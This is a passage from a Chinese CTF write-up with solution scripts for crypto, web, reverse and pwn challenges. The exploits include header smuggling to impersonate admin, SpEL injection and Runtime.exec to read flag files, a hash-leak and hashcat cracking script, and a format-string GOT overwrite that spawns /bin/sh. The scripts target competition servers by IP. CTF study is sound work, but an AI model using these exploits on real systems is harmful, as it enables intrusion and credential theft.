batch_size)] print(f\u0026#34;[+] 分成 {len(batches)} 批，每批约 {batch_size} 个包\u0026#34;) print(f\u0026#34;[+] 开始并行处理...\u0026#34;) # 重置计数器 processed_counter = 0 rtp_counter = 0 # 多线程处理 results = [] with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor: futures = [executor.submit(process_packet_batch, batch) for batch in batches] for future in futures: results.append(future.result()) print(f\u0026#34;[+] 合并结果...\u0026#34;) streams = merge_streams(results) print(f\u0026#34;\\n[+] 处理完成!\u0026#34;) print(f\u0026#34;[+] 总数据包: {total_packets}\u0026#34;) print(f\u0026#34;[+] RTP数据包: {rtp_counter}\u0026#34;) print(f\u0026#34;[+] 识别出 {len(streams)} 个RTP流\\n\u0026#34;) # 保存每个流 for idx, (ssrc, stream_data) in enumerate(streams.items(), 1): packets_list = stream_data[\u0026#39;packets\u0026#39;] payload_type = stream_data[\u0026#39;payload_type\u0026#39;] # 按序列号排序 packets_list.sort(key=lambda x: x[\u0026#39;sequence\u0026#39;]) print(f\u0026#34;流 #{idx} - SSRC: 0x{ssrc:08X}\u0026#34;) print(f\u0026#34; 数据包数: {len(packets_list)}\u0026#34;) print(f\u0026#34; Payload Type: {payload_type}\u0026#34;) print(f\u0026#34; {stream_data[\u0026#39;src_ip\u0026#39;]}:{stream_data[\u0026#39;src_port\u0026#39;]} -\u0026gt; \u0026#34; f\u0026#34;{stream_data[\u0026#39;dst_ip\u0026#39;]}:{stream_data[\u0026#39;dst_port\u0026#39;]}\u0026#34;) # 确定编码 if payload_type == 0: codec = \u0026#34;G.711 μ-law (PCMU)\u0026#34; needs_decode = True elif payload_type == 8: codec = \u0026#34;G.711 A-law (PCMA)\u0026#34; needs_decode = True else: codec = f\u0026#34;未知 (PT={payload_type})\u0026#34; needs_decode = False print(f\u0026#34; 编码: {codec}\u0026#34;) # 合并payload raw_data = b\u0026#39;\u0026#39;.join(p[\u0026#39;payload\u0026#39;] for p in packets_list) # 保存原始数据 raw_file = os.path.join(OUTPUT_DIR, f\u0026#34;stream_{idx}_{ssrc:08X}.raw\u0026#34;) with open(raw_file, \u0026#39;wb\u0026#39;) as f: f.write(raw_data) print(f\u0026#34; 原始文件: {raw_file} ({len(raw_data)} 字节)\u0026#34;) # 解码并保存WAV if needs_decode and payload_type == 0: try: pcm_data = decode_mulaw_fast(raw_data) wav_file = os.path.join(OUTPUT_DIR, f\u0026#34;stream_{idx}_{ssrc:08X}.wav\u0026#34;) with wave.open(wav_file, \u0026#39;wb\u0026#39;) as wav: wav.setnchannels(1) # 单声道 wav.setsampwidth(2) # 16-bit wav.setframerate(8000) # 8kHz wav.writeframes(pcm_data) duration = len(pcm_data) / (8000 * 2) print(f\u0026#34; WAV文件: {wav_file} (时长: {duration:.2f}秒)\u0026#34;) except Exception as e: print(f\u0026#34; WAV转换失败: {e}\u0026#34;) print() print(f\u0026#34;[+] 所有文件已保存到: {OUTPUT_DIR}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 脚本解密得到解压密码5f3eb916bf08e610aeb09f60bc955bd8\n解开音频，听到双鲤湖西岸南山茶铺结合题目信息1949.10和真实历史事件查询得知金门战役，日期为10.24，与音频中廿四担秋茶匹配，同时音频提及辰时正过三刻，即8.45，结合信息可得1949年10月24日8时45分于双鲤湖西岸南山茶铺，md5作为答案提交即可\n你们可以感受一下（自行解压收听）： 绝密录音.zip\nThe_Interrogation_Room 解题思路 像极了审讯犯人录口供，要在有限的交互中gank8个secrets，这里根据server.py中的代码需要在审讯时进行严厉拷打，需要注意的是要先试用PoW来解sha256，然后在17个问题中确定8个秘密的值，这里可以通过构造s[i]==1来直接提问前8个问题，后9个是四元奇偶校验问题，检查四个比特中是否有奇数个为1。后面的直接用析取范式来搞，脚本遍历所有256种可能的8比特赋值，对于每种赋值，计算预测的17个回答。比较预测回答与实际观测回答，计算矛盾次数，择矛盾次数最少的赋值作为提交答案。具体可看exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 Python python #!/usr/bin/env python3 # -*- coding: utf-8 -*- # # 交互解题脚本： # - 自动 PoW: 解 sha256(XXXX+suffix) == hexdigest # - 每轮 17 次问答：8 个单比特询问 + 9 个四元“奇数个为真”校验 # - 收到 17 个 True/False 后，遍历 2^8=256 个可能向量，计算与观测向量的矛盾次数，取最小者提交 import re import sys import time import string import itertools from hashlib import sha256 from concurrent.futures import ThreadPoolExecutor, as_completed from pwn import remote, context from pwn import * context(arch = \u0026#39;amd64\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) HOST = \u0026#34;8.147.135.220\u0026#34; PORT = 36899 ALPHABET = string.ascii_letters + string.digits # 62^4 搜索空间 # 9 个四元校验的下标集合（保证每个比特至少出现 4 次） CHECKS = [ (0, 1, 2, 3), # C0 (0, 4, 5, 6), # C1 (0, 1, 4, 7), # C2 (1, 2, 5, 7), # C3 (2, 3, 6, 7), # C4 (3, 4, 5, 7), # C5 (0, 2, 4, 6), # C6 (1, 3, 5, 6), # C7 (0, 1, 2, 7), # C8 ] def solve_pow(suffix: str, target_hex: str, threads: int = 16) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34; 求解 XXXX 使 sha256(XXXX + suffix) == target_hex 多线程分片：按首字符分成 62 片，每个线程负责若干首字符。 \u0026#34;\u0026#34;\u0026#34; found = [None] def worker(prefixes): for c0 in prefixes: # 62^3 = 238,328 次循环 / 前缀 for c1 in ALPHABET: for c2 in ALPHABET: for c3 in ALPHABET: x = c0 + c1 + c2 + c3 if sha256((x + suffix).encode()).hexdigest() == target_hex: return x return None # 平分 ALPHABET 给 threads 个任务桶 buckets = [[] for _ in range(threads)] for i, ch in enumerate(ALPHABET): buckets[i % threads].append(ch) with ThreadPoolExecutor(max_workers=threads) as ex: futs = [ex.submit(worker, bucket) for bucket in buckets] for fu in as_completed(futs): ans = fu.result() if ans: # 取消剩余任务 for f2 in futs: f2.cancel() return ans raise RuntimeError(\u0026#34;PoW 解失败（时间可能不够？可以把线程开大点或换更快的机器试试）\u0026#34;) def bit_questions(): \u0026#34;\u0026#34;\u0026#34;前 8 个单比特问题：\u0026#39;( S{i} == 1 )\u0026#39;\u0026#34;\u0026#34;\u0026#34; return [f\u0026#34;( S{i} == 1 )\u0026#34; for i in range(8)] def xor_expr(indices): \u0026#34;\u0026#34;\u0026#34; 生成“这几个变量中有奇数个为 1”的布尔表达式（仅用 and/or/()==0/1） DNF：把所有奇数个 1 的指派列举出来。 \u0026#34;\u0026#34;\u0026#34; vars_idx = list(indices) k = len(vars_idx) terms = [] for mask in range(1 \u0026lt;\u0026lt; k): if bin(mask).count(\u0026#34;1\u0026#34;) % 2 == 1: # 奇数个 1 lits = [] for pos, j in enumerate(vars_idx): v = 1 if (mask \u0026gt;\u0026gt; pos) \u0026amp; 1 else 0 lits.append(f\u0026#34;( S{j} == {v} )\u0026#34;) terms.append(\u0026#34;( \u0026#34; + \u0026#34; and \u0026#34;.join(lits) + \u0026#34; )\u0026#34;) return \u0026#34;( \u0026#34; + \u0026#34; or \u0026#34;.join(terms) + \u0026#34; )\u0026#34; def parity_questions(): \u0026#34;\u0026#34;\u0026#34;后 9 个四元奇偶问题\u0026#34;\u0026#34;\u0026#34; return [xor_expr(indices) for indices in CHECKS] def all_questions(): \u0026#34;\u0026#34;\u0026#34;拼成总共 17 个问题（严格使用白名单 token，并确保空格分隔）\u0026#34;\u0026#34;\u0026#34; return bit_questions() + parity_questions() def predict_answers(assignment_bits): \u0026#34;\u0026#34;\u0026#34; 对给定 8 比特 assignment_bits（0/1 列表），预测 17 个问题在“囚徒不说谎”情况下的答案（True/False） \u0026#34;\u0026#34;\u0026#34; s = assignment_bits # 前 8 个：直接等于对应比特是否为 1 ans = [bool(s[i]) for i in range(8)] # 后 9 个：四元奇偶（奇数个为 1） for indices in CHECKS: parity = sum(s[j] for j in indices) % 2 ans.append(bool(parity)) return ans def nearest_assignment(observed_answers): \u0026#34;\u0026#34;\u0026#34; 观测到 17 个 True/False（其中恰有 2 次反转），在 256 个候选中选出“矛盾最少”的 assignment（若多解取第一个） \u0026#34;\u0026#34;\u0026#34; best = None best_dist = 1 \u0026lt;\u0026lt; 30 for x in range(256): assign = [(x \u0026gt;\u0026gt; i) \u0026amp; 1 for i in range(8)] # 低位对应 S0 pred = predict_answers(assign) dist = sum(pa != oa for pa, oa in zip(pred, observed_answers)) if dist \u0026lt; best_dist: best_dist = dist best = assign if best_dist == 0: break # 理论上 best_dist 应 ≤ 2；但即使 2 谎恰好“碰撞”，我们依然取最近邻 return best, best_dist def parse_bool_line(line: bytes) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; 解析 \u0026#34;Prisoner\u0026#39;s response: True!\\n\u0026#34; / \u0026#34;False!\\n\u0026#34; 之类 \u0026#34;\u0026#34;\u0026#34; m = re.search(rb\u0026#34;(True|False)\u0026#34;, line) if not m: raise ValueError(f\u0026#34;无法解析返回：{line!r}\u0026#34;) return m.group(1) == b\u0026#34;True\u0026#34; def one_round(io) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; 跑一轮：发 17 个问题，收 17 个答复，算出 8 比特并提交。成功返回 True，失败（被当场嘲笑）返回 False。 \u0026#34;\u0026#34;\u0026#34; qs = all_questions() answers = [] for q in qs: io.recvuntil(b\u0026#34;Ask your question:\u0026#34;) io.sendline(q.encode()) # 紧接着会有一行“Prisoner\u0026#39;s response: X!” line = io.recvuntil(b\u0026#39;\\n\\n\u0026#39;) if not line: raise EOFError(\u0026#34;连接被关闭或超时\u0026#34;) ans = parse_bool_line(line) answers.append(ans) # 提交答案 io.recvuntil(b\u0026#34;Now reveal the true secrets\u0026#34;) assign, dist = nearest_assignment(answers) submit = \u0026#34; \u0026#34;.join(str(b) for b in assign) io.sendline(submit.encode()) # 读一行判定 line = io.recvline(timeout=5) or b\u0026#34;\u0026#34; if b\u0026#34;laughs triumphantly\u0026#34; in line: return False return True def main(): io = remote(HOST, PORT) # ==== PoW ==== data = io.recvuntil(b\u0026#34;Give me XXXX: \u0026#34;, timeout=5) # 例如：sha256(XXXX+abcDEF...) == deadbeef... m = re.search(rb\u0026#34;sha256\\(XXXX\\+(?P\u0026lt;sfx\u0026gt;[A-Za-z0-9]+)\\) == (?P\u0026lt;hex\u0026gt;[0-9a-f]{64})\u0026#34;, data) if not m: print(data.decode(errors=\u0026#34;ignore\u0026#34;)) raise RuntimeError(\u0026#34;没抓到 PoW 提示\u0026#34;) suffix = m.group(\u0026#34;sfx\u0026#34;).decode() target = m.group(\u0026#34;hex\u0026#34;).decode() t0 = time.time() xxxx = solve_pow(suffix, target, threads=16) t1 = time.time() log.info(f\u0026#34;PoW solved: {xxxx} (耗时 {t1 - t0:.2f}s)\u0026#34;) io.sendline(xxxx.encode()) # 可能会有 Notice 和欢迎词 # 然后进入 TURNS=25 轮 rounds = 0 try: while True: # 等待每轮开始时的欢迎段落（不严格匹配，直到看到 \u0026#34;Ask your question:\u0026#34;） io.recvuntil(b\u0026#34;Ask your question:\u0026#34;, timeout=10) # 这一行已经吃掉了第一句提示，所以先发一个 no-op 回退？不，我们把它当作第 1 个问答的提示，直接发第 1 个问题即可。 # 由于上面消耗了一个 \u0026#34;Ask your question:\u0026#34;, 我们这里需要把第一个问题单独发掉。 qs = all_questions() answers = [] # 第一个问题（已经有提示了） io.sendline(qs[0].encode()) line = io.recvuntil(b\u0026#39;\\n\\n\u0026#39;) or b\u0026#34;\u0026#34; ans = parse_bool_line(line) answers.append(ans) # 余下 16 个 for q in qs[1:]: io.recvuntil(b\u0026#34;Ask your question:\u0026#34;) io.sendline(q.encode()) line = io.recvuntil(b\u0026#39;!\\n\\n\u0026#39;) or b\u0026#34;\u0026#34; ans = parse_bool_line(line) answers.append(ans) io.recvuntil(b\u0026#34;Now reveal the true secrets\u0026#34;) assign, dist = nearest_assignment(answers) submit = \u0026#34; \u0026#34;.join(str(b) for b in assign) io.sendline(submit.encode()) # 读回合结果 line = io.recv(timeout=5) or b\u0026#34;\u0026#34; rounds += 1 log.success(f\u0026#34;Round {rounds} done; decoding distance={dist}\u0026#34;) # 如果失败会直接退出，这里兜底多读几行看有没有 flag if b\u0026#34;laughs triumphantly\u0026#34; in line: print(line.decode(errors=\u0026#34;ignore\u0026#34;)) break # 可能还会有一段继续提示 # 检查是否已经给出 flag more = io.recv(timeout=0.5) or b\u0026#34;\u0026#34; print(more.decode()) if b\u0026#34;flag\u0026#34; in more.lower(): print(more.decode(errors=\u0026#34;ignore\u0026#34;)) break except EOFError: pass except KeyboardInterrupt: pass finally: # 尝试把最后的输出都打出来（包含 flag） try: rest = io.recvrepeat(1.0) if rest: print(rest.decode(errors=\u0026#34;ignore\u0026#34;)) except Exception: pass io.close() if __name__ == \u0026#34;__main__\u0026#34;: main() flag flag{e9f1e129-66a1-4439-adf5-81bf936a7b06}\nCrypto check-little N和c的位数一样长，那么 key^3 远大于 N，取模后 c 是 key^3 mod N,考虑key=p，然后解aes即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import math import gmpy2 from Crypto.Util.number import * from Crypto.Cipher import AES N = 18795243691459931102679430418438577487182868999316355192329142792373332586982081116157618183340526639820832594356060100434223256500692328397325525717520080923556460823312550686675855168462443732972471029248411895298194999914208659844399140111591879226279321744653193556611846787451047972910648795242491084639500678558330667893360111323258122486680221135246164012614985963764584815966847653119900209852482555918436454431153882157632072409074334094233788430465032930223125694295658614266389920401471772802803071627375280742728932143483927710162457745102593163282789292008750587642545379046283071314559771249725541879213 c = 10533300439600777643268954021939765793377776034841545127500272060105769355397400380934565940944293911825384343828681859639313880125620499839918040578655561456321389174383085564588456624238888480505180939435564595727140532113029361282409382333574306251485795629774577583957179093609859781367901165327940565735323086825447814974110726030148323680609961403138324646232852291416574755593047121480956947869087939071823527722768175903469966103381291413103667682997447846635505884329254225027757330301667560501132286709888787328511645949099996122044170859558132933579900575094757359623257652088436229324185557055090878651740 p = math.gcd(c, N) key_bytes = long_to_bytes(p)[:16] iv = b\u0026#39;\\x91\\x16\\x04\\xb9\\xf0RJ\\xdd\\xf7}\\x8cW\\xe7n\\x81\\x8d\u0026#39; c1 = bytes.fromhex(\u0026#39;bf87027bc63e69d3096365703a6d47b559e0364b1605092b6473ecde6babeff2\u0026#39;) cipher = AES.new(key=key_bytes, iv=iv, mode=AES.MODE_CBC) m = cipher.decrypt(c1) print(m) #b\u0026#39;flag{m_m4y_6e_divIS1b1e_by_p?!}\\x01\u0026#39; 这里密码✌师傅也是尽力了，还有一道ezran没爆出来。\nWeb SecretVault 解题思路 根据附件中的容器搭建本地服务后审计代码发现flask前端的路由、自定义头是一个非常抽象的东西。\nGo是一个用于处理jwt的签名Proxy，会分别读取并del掉Authorization、X-User、XFF、Cookie，但是你会发现X-User为空时直接传参会添加一个0值，既然它有一个/sign路由，在flask中主要在/dashboard中做文章，会发现一个非常神奇的点，如果我把X-User干到connection: close后面，由于使用的是短连接，就可以直接新建一个会话，如下图，因为admin的uid为 0，那么由于没有X-User对应的值，这里就会直接当成 uid 为0了，那么就可以被误认为是admin，随后显示flag。\n需要定义\n1 2 http Connection: close, X-User flag flag{15b2df1f-4780-4643-b029-978b22cd504e}\nbbtv 解题思路 Spel类中第一个Bean可以通过SystemProperties的system.getProperties函数来获取当前系统中的配置内容，第二个bean用于执行上面的Bean，在/check路由中通过传rule参数执行提交的systemProperties然后转移给service进行查询，用URL编码 #{#systemProperties[\u0026lsquo;os.name\u0026rsquo;]} 传递过去发现可以正常执行。\ncontroller中需要注意的是File在通过获取user.home之后可以直接在/tmp中读取flag.txt（Dockerfile里面把flag.txt给COPY到/tmp/flag.txt）\n通过构造Spel表达式执行#{#systemProperties['user.home'] = '/tmp'}即可直接读取到flag.txt里面的内容（不指定/tmp会默认访问/root导致无法读取flag）\nflag flag{e116678c-bf91-4b4a-9d56-099bc6c5ca2d}\nyamcs 解题思路 这个功能点可以执行代码并输出，直接java命令执行改个类型输出到原来的out0\n1 2 3 4 5 6 7 try { Process p = Runtime.getRuntime().exec(\u0026#34;cat /flag\u0026#34;); String output = new String(p.getInputStream().readAllBytes(), java.nio.charset.StandardCharsets.UTF_8); out0.setStringValue(output); } catch (Exception e) { out0.setStringValue(\u0026#34;Error occurred\u0026#34;); } flag anime 解题思路 原题 of HCMUS CTF 2025 Quals - MAL\nhttps://psdat123.github.io/posts/HCMUS-CTF-2025/\n查看源码和wp，写个脚本爆一下\n注：代码部分内容来自上述wp，如有雷同正常现象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 import base64 from binascii import unhexlify import string import requests from bs4 import BeautifulSoup username = \u0026#34;fadhilfaizullah\u0026#34; user_secret = \u0026#34;u2DAetreDVaTrL8leVf1\u0026#34; sess = requests.Session() url = \u0026#34;http://47.105.120.74:1001/\u0026#34; admin_username = \u0026#34;TTXSMcc\u0026#34; sess.cookies.update({\u0026#34;session\u0026#34;:\u0026#34;eyJmbGFzaCI6e30sInBhc3Nwb3J0Ijp7InVzZXIiOiJmYWRoaWxmYWl6dWxsYWgifX0=\u0026#34;,\u0026#34;session.sig\u0026#34;:\u0026#34;v_MFDm1eMitgRSoZPC28Kghmqio\u0026#34;}) def changeField(field_name, guess_hash): resp = sess.post(url + f\u0026#39;/user/{username}/edit\u0026#39;, data={field_name: guess_hash, \u0026#39;secret\u0026#39;: user_secret},allow_redirects=False) print(resp.status_code) res = sess.get(url + f\u0026#39;/users?sort={field_name}\u0026amp;limit=1000\u0026amp;skip=0\u0026#39;) soup = BeautifulSoup(res.text, \u0026#39;html.parser\u0026#39;) users = soup.find_all(\u0026#39;a\u0026#39;, {\u0026#39;class\u0026#39;: \u0026#39;anime_title\u0026#39;}) for user in users: if admin_username in user: print(\u0026#34;test \u0026#34;,guess_hash,\u0026#34; found \u0026#34;,admin_username) return 1 if username.lower() in repr(user).lower(): print(\u0026#34;test \u0026#34;,guess_hash,\u0026#34; found \u0026#34;,username) return -1 # def leak_field(field_name, length, alphabet=\u0026#34;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34;,known_prefix=\u0026#34;\u0026#34;): def leak_field(field_name, length, alphabet=\u0026#34;0123456789abcdef\u0026#34;,known_prefix=\u0026#34;\u0026#34;): field_value = known_prefix for position in range(length-len(known_prefix)): L = 0 R = len(alphabet) - 1 while L \u0026lt;= R: M = (L + R) // 2 guess_char = alphabet[M] current_guess = field_value + guess_char # 测试当前猜测 pos = changeField(field_name, current_guess + alphabet[0] * (length - len(current_guess) - 1)) if pos == 1: # 我们的用户名在当前猜测之前，说明猜测的字符太大 R = M - 1 else: # 我们的用户名在当前猜测之后，说明猜测的字符太小或正确 L = M + 1 # 找到正确字符 if L \u0026lt;= len(alphabet) - 1: print(\u0026#34;L=\u0026#34;,L,\u0026#34; R=\u0026#34;,R) if position != length-len(known_prefix)-1: num = L - 1 else: num = L if num \u0026lt; 0: num = 0 field_value += alphabet[num] else: # 如果没有找到合适的字符，可能需要处理边界情况 print(\u0026#34;L=\u0026#34;,L,\u0026#34; R=\u0026#34;,R) field_value += alphabet[-1] print(f\u0026#34;[*] Progress: {field_value} [{len(field_value)}/{length}]\u0026#34;) return field_value print(\u0026#34;[!] Leaking admin hash\u0026#34;) admin_hash = leak_field(\u0026#39;hash\u0026#39;, 64, known_prefix=\u0026#34;\u0026#34;) print(\u0026#34;[!] Leaking admin salt\u0026#34;) admin_salt = leak_field(\u0026#39;salt\u0026#39;, 32, known_prefix=\u0026#34;\u0026#34;) hash_cat_string = f\u0026#34;sha256:25000:{base64.b64encode(admin_salt.encode()).decode()}:{base64.b64encode(unhexlify(admin_hash)).decode()}\u0026#34; print(f\u0026#34;[*] hashcat string: {hash_cat_string}\u0026#34;) hash_file = \u0026#34;hash\u0026#34; with open(hash_file, \u0026#39;w\u0026#39;) as f: f.write(hash_cat_string) hashcat_command = f\u0026#34;hashcat -a 3 -m 10900 {hash_file} ?d?d?d?d?d\u0026#34; print(f\u0026#34;[*] Run the following command to crack the password:\\n{hashcat_command}\u0026#34;) 爆完hashcat即可；得到密码后登录保存一下cookie。\n1 session=eyJwYXNzcG9ydCI6eyJ1c2VyIjoiVFRYU01jYyJ9LCJmbGFzaCI6e319; session.sig=1WywbgpLq6qXl37ncMrK1MV70gQ 由于管理员secret被缓存为random value，我们需要绕过缓存，而数据库是大小写不敏感，缓存敏感，我们可以构造不同大小写的管理员id，即可得到flag。\n1 http://47.105.120.74:1001/user/TTXSMCC/edit flag Reverse butterfly 解题思路 随意输入flag{11111111111111111111111111111}\\n得到：\n猜测是 8 字节加密，找到关键逻辑：\n写反向算法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 with open(\u0026#39;encode.dat.key\u0026#39;, \u0026#39;rb\u0026#39;) as f: key = f.read() with open(\u0026#39;encode.dat\u0026#39;, \u0026#39;rb\u0026#39;) as f: encoded_data = list(f.read()) def solve(encoded_data: list, key: bytes) -\u0026gt; bytes: data = [] for x, y in zip(encoded_data, key): data.append((x - y) \u0026amp; 0xFF) bn = int.from_bytes(bytes(data), \u0026#39;little\u0026#39;) bn = ((bn \u0026gt;\u0026gt; 1) | (bn \u0026lt;\u0026lt; 63)) \u0026amp; ((1 \u0026lt;\u0026lt; 64) - 1) bt = bn.to_bytes(8, \u0026#39;little\u0026#39;) data = [0] * 8 for i in range(0, 8, 2): data[i], data[i + 1] = bt[i + 1], bt[i] for i, b in enumerate(key): data[i] ^= b return bytes(data) for i in range(0, len(encoded_data) // 8 * 8, 8): encoded_data[i:i + 8] = solve(encoded_data[i:i + 8], key[:8]) print(bytes(encoded_data)) flag flag{butter_fly_mmx_encode_7778167}\nPWN flag-market 多亏pwn-s.师傅，把这题肝下了，在这里致谢。 flag-market\n解题思路 scanf 溢出：\n溢出可修改data段format字符串，导致格式化字符串漏洞，第一次泄露地址+修改exit got表为main函数，第二次修改atoi got表为system getshell。\nexp、flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 #coding=utf-8 from pwn import* context.log_level=\u0026#39;debug\u0026#39; context.arch=\u0026#39;amd64\u0026#39; binary = \u0026#34;./pwn\u0026#34; elf = ELF(binary) libc=elf.libc ip = \u0026#39;47.93.216.175\u0026#39; port = 20539 local = 0 if local: io = process(binary) else: io = remote(ip, port) if args.G: gdb.attach(io) def ret2libc(): return (p64(next(libc.search(asm(\u0026#34;ret;\u0026#34;),executable=True)))+p64(next(libc.search(asm(\u0026#39;pop rdi; ret;\u0026#39;))))+p64(next(libc.search(\u0026#34;/bin/sh\u0026#34;)))+p64(libc.sym[\u0026#39;system\u0026#39;])) def ret2libc_(): return (p64(next(libc.search(asm(\u0026#39;pop rdi; ret;\u0026#39;))))+p64(next(libc.search(\u0026#34;/bin/sh\u0026#34;)))+p64(libc.sym[\u0026#39;system\u0026#39;])) def dbg(c=\u0026#39;\u0026#39;): if(c): gdb.attach(io, c) else: gdb.attach(io) s=lambda data :io.send(data) sa=lambda delim,data :io.sendafter(delim, data) sl=lambda data :io.sendline(data) sla=lambda delim,data :io.sendlineafter(delim, data) r=lambda numb=4096 :io.recv(numb) ru=lambda delims :io.recvuntil(delims) uu32 = lambda : u32(io.recvuntil(b\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4, b\u0026#39;\\x00\u0026#39;)) uu64 = lambda : u64(io.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) uheap = lambda : u64(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) leak=lambda name,addr :log.success(\u0026#39;{} ===\u0026gt; {:#x}\u0026#39;.format(name, addr)) ia = lambda : io.interactive() n32 = lambda num: p32(0x100000000+num) n64= lambda num: p64(0x10000000000000000+num) ##gdb.attach(io,\u0026#39;dir ~/glibc/malloc/\u0026#39;) main=0x040139B def pwn(): #dbg(\u0026#34;b *0x4014bc\\nc\u0026#34;) pl=\u0026#34;a\u0026#34;*0x100 pl+=\u0026#34;%\u0026#34;+str(0x139b)+\u0026#34;c\u0026#34;+\u0026#34;%12$hn\u0026#34;+\u0026#34;%45$p\u0026#34; ru(\u0026#34;.exit\u0026#34;) sl(b\u0026#34;1\u0026#34;) ru(\u0026#34;o pay?\u0026#34;) sl(b\u0026#34;-1\u0026#34;) ru(\u0026#34;e report\u0026#34;) sl(pl) ru(\u0026#34;2.exit\u0026#34;) sl(b\u0026#34;1\u0026#34;) ru(\u0026#34;o pay?\u0026#34;) sl(p64(0x404090)) ru(\u0026#34;0x\u0026#34;) libc.address=int(r(12),16)-0x2a28b leak(\u0026#34;libc\u0026#34;,libc.address) pl1=\u0026#34;a\u0026#34;*0x100 pl1+=\u0026#34;%\u0026#34;+str(libc.sym[\u0026#39;system\u0026#39;]\u0026amp;0xffff)+\u0026#34;c\u0026#34;+\u0026#34;%12$hn\u0026#34; pl1+=\u0026#34;%\u0026#34;+str((0x10000-(libc.sym[\u0026#39;system\u0026#39;]\u0026amp;0xffff))+((libc.sym[\u0026#39;system\u0026#39;]\u0026gt;\u0026gt;16)\u0026amp;0xffff))+\u0026#34;c\u0026#34;+\u0026#34;%13$hn\u0026#34; ru(\u0026#34;2.exit\u0026#34;) sl(b\u0026#34;2\u0026#34;) ru(\u0026#34;.exit\u0026#34;) sl(b\u0026#34;1\u0026#34;) ru(\u0026#34;o pay?\u0026#34;) sl(b\u0026#34;-1\u0026#34;) ru(\u0026#34;e report\u0026#34;) sl(pl1) ru(\u0026#34;2.exit\u0026#34;) sl(b\u0026#34;1\u0026#34;) ru(\u0026#34;o pay?\u0026#34;) s(p64(0x404080)+p64(0x404082)) ru(\u0026#34;exit\u0026#34;) sl(\u0026#34;/bin/sh\u0026#34;) pwn() ia() flag{9dda09d1-5b1a-4551-b293-feb59b0373f6}\nbph bph\n解题思路 一开始看到沙箱保护，禁用open的，没禁read、write，我是想着找一找flag文件描述符fd的，看看flag有无事先被打开，结果发现没有被打开，导致浪费了很多时间。\n浪费太多时间在代码审计上以至于知道程序的用途却不知道漏洞\u0026hellip;\u0026hellip;\n前置准备 正确的整体思路是泄露 libc 基地址 → 控制堆内存伪造 IO 结构 → 利用 IO 流漏洞或 setcontext 劫持执行流 → 执行 ROP 链读取 flag。\nchecksec查看保护信息：全开。\n查看沙箱保护信息：\n在IDA上进行main函数分析（IDA空间有限，截图截不全\u0026hellip;）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { char v4[40]; // [rsp+0h] [rbp-68h] BYREF unsigned __int64 v5; // [rsp+28h] [rbp-40h] v5 = __readfsqword(0x28u); sub_16C0(a1, a2, a3); sub_1540(); sub_1640(); while ( 2 ) { while ( 1 ) { puts(\u0026#34;\u0026#34;); puts(\u0026#34;1) Create note\u0026#34;); puts(\u0026#34;2) Edit note\u0026#34;); puts(\u0026#34;3) View note\u0026#34;); puts(\u0026#34;4) Delete note\u0026#34;); puts(\u0026#34;6) Exit\u0026#34;); __printf_chk(2LL, \u0026#34;Choice: \u0026#34;); if ( fgets(v4, 32, stdin) ) break; LABEL_9: puts(\u0026#34;bad choice\u0026#34;); } switch ( (unsigned int)__isoc23_strtol(v4, 0LL, 10LL) ) { case 1u: sub_1810(); continue; case 2u: sub_1930(); continue; case 3u: __printf_chk(2LL, \u0026#34;Index: \u0026#34;); sub_1710(); continue; case 4u: sub_1A50(); continue; case 6u: puts(\u0026#34;bye\u0026#34;); return 0LL; default: goto LABEL_9; } } } 从 main 函数反编译代码可知，程序是一个典型的 \u0026ldquo;笔记管理系统\u0026rdquo;，提供以下功能：\n创建笔记（Create note）\n编辑笔记（Edit note）\n查看笔记（View note）\n删除笔记（Delete note）\n退出（Exit）\n那我的初步思路可能就是从栈溢出、堆利用起手，有想过UAF的，不过联系不大就放弃这个想法了。\ns.师傅一开始是用exit的，但因为用exit的时候，这个puts会调用stdout导致有干扰，又因为Ta之前把io list all和stdout都改了，破坏了stdout，后面修复了stdout，调用到了io clean 